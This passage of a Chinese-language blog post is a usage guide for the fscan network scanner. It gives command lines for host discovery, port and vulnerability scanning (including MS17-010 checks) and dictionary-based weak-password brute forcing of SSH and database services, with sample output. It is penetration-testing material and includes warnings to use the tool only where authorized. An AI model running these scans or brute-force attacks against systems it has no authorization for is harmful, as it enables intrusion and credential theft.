80,443,3306 # 指定端口./fscan -h 目标 -o result.txt           # 保存结果到文件\n\n3.2 主要参数说明-h  指定目标IP或网段，支持格式:    192.168.1.1    192.168.1.1/24    192.168.1.1-255    txt文件(每行一个IP或网段)-p  指定扫描端口，默认为常见端口    示例: -p 80,443,3389    示例: -p 1-65535    示例: -p -能力检测时，会自动加载-pa 启用全部协议检测，消耗资源较大-no 不进行存活探测，直接扫描-o  输出结果到文件-np 不使用ping进行存活检测-nopoc 不扫描漏洞-nobr 不进行爆破-nolan 不扫描内网资产\n\n4. 高级功能使用4.1 主机发现# 仅执行主机发现./fscan -h 192.168.1.1/24 -m -p# 使用ICMP进行存活探测./fscan -h 192.168.1.1/24 -ping# 不使用ping进行存活探测./fscan -h 192.168.1.1/24 -np\n\n4.2 服务识别与漏洞扫描# 进行Web服务识别及漏洞扫描./fscan -h 192.168.1.1/24 -web# 扫描全部漏洞./fscan -h 192.168.1.1/24 -full# 不扫描漏洞./fscan -h 192.168.1.1/24 -nopoc\n\n4.3 弱口令爆破# 对所有支持的服务进行弱口令爆破./fscan -h 192.168.1.1/24 -user admin -pwd admin123# 指定爆破特定服务./fscan -h 192.168.1.1/24 -m ssh -user admin -pwd admin123# 使用自定义密码字典./fscan -h 192.168.1.1/24 -pwdf passwords.txt# 使用自定义用户名字典./fscan -h 192.168.1.1/24 -userf usernames.txt\n\n4.4 自定义扫描# 指定线程数./fscan -h 192.168.1.1/24 -t 100# 设置超时时间./fscan -h 192.168.1.1/24 -timeout 5# 只扫描特定模块./fscan -h 192.168.1.1/24 -m smb,mysql,mssql\n\n5. 实际应用示例5.1 快速内网扫描# 快速扫描内网C段./fscan -h 192.168.1.0/24# 输出结果[*] Scanning subnet: 192.168.1.0/24[+] Found alive host: 192.168.1.1[+] Found alive host: 192.168.1.100[+] Found alive host: 192.168.1.254[*] Scanning port for 192.168.1.1[+] 192.168.1.1:80 open[+] 192.168.1.1:443 open[+] Web service detected on 192.168.1.1:80[*] Scanning port for 192.168.1.100[+] 192.168.1.100:22 open[+] 192.168.1.100:3306 open[+] 192.168.1.100:8080 open[+] MySQL service detected on 192.168.1.100:3306[+] Web service detected on 192.168.1.100:8080\n\n5.2 定向漏洞扫描# 扫描特定漏洞./fscan -h 192.168.1.100 -m ms17010# 输出结果[*] Scanning target: 192.168.1.100[*] Checking MS17-010 vulnerability[+] 192.168.1.100 is vulnerable to MS17-010\n\n5.3 针对性弱口令检测# 针对MySQL服务进行弱口令检测./fscan -h 192.168.1.100 -m mysql -user root -pwdf mysql_passwords.txt# 输出结果[*] Scanning MySQL service: 192.168.1.100:3306[*] Brute forcing MySQL...[+] MySQL weak password found: root/123456\n\n6. 注意事项\n权限需求\n# 部分功能需要管理员/root权限sudo ./fscan -h 192.168.1.1/24\n\n扫描流量\n# 大范围扫描会产生大量流量，可能触发IDS/IPS./fscan -h 192.168.1.1/24 -t 10  # 降低线程数减轻影响\n\n误报处理\n# 漏洞扫描可能存在误报，需要手动验证./fscan -h 192.168.1.1 -full -o result.txt  # 输出结果后进行人工分析\n\n合规使用\n# 仅在授权的环境中使用# 未经许可使用可能违反法律法规\n\n7. 最佳实践\n分阶段扫描\n# 第一阶段：主机发现./fscan -h 192.168.1.1/24 -m -p -o alive_hosts.txt# 第二阶段：端口扫描./fscan -h 192.168.1.1/24 -no -p 1-65535 -o open_ports.txt# 第三阶段：漏洞扫描./fscan -h 192.168.1.1/24 -no -full -o vulnerabilities.txt\n\n针对性扫描\n# 针对Web服务器./fscan -h 192.168.1.100 -p 80,443,8080 -web# 针对数据库服务器./fscan -h 192.168.1.101 -p 1433,3306,5432 -m mysql,mssql,postgresql\n\n降低影响\n# 降低线程数./fscan -h 192.168.1.1/24 -t 10# 限制扫描范围./fscan -h 192.168.1.100-110 -p 22,80,443,3306,3389# 避开敏感时间# 在网络流量低的时段执行扫描\n\n结果分析\n# 将结果输出到不同文件进行分类分析./fscan -h 192.168.1.1/24 -o scan_results.txt# 使用grep提取关键信息grep &quot;weak password&quot; scan_results.txt &gt; weak_passwords.txtgrep &quot;vulnerable&quot; scan_results.txt &gt; vulnerabilities.txt\n\n8. 进阶用法8.1 与其他工具联动# 扫描结果传递给其他工具./fscan -h 192.168.1.1/24 -p 80,443 -o web_servers.txtcat web_servers.txt | grep open | awk &#x27;&#123;print $1&#125;&#x27; &gt; targets.txt# 将targets.txt传给其他漏洞扫描工具\n\n8.2 自定义扫描模板# 为特定环境创建扫描脚本cat &lt;&lt; &#x27;EOF&#x27; &gt; custom_scan.sh#!/bin/bash# 快速扫描脚本./fscan -h $1 -p 22,80,443,3306,3389 -o quick_scan.txt# 分析结果echo &quot;发现开放服务:&quot;grep &quot;open&quot; quick_scan.txtecho &quot;发现漏洞:&quot;grep &quot;vulnerable&quot; quick_scan.txtEOFchmod +x custom_scan.sh./custom_scan.sh 192.168.1.1/24\n\n8.3 批量扫描# 创建目标文件cat &lt;&lt; &#x27;EOF&#x27; &gt; targets.txt192.168.1.0/24192.168.2.0/2410.10.10.1-100EOF# 批量扫描./fscan -h targets.txt -o batch_results.txt\n\n未经授权的扫描可能违反法律法规\n","categories":["web","渗透"],"tags":["渗透测试","内网扫描","网络安全","信息收集","漏洞扫描"]}]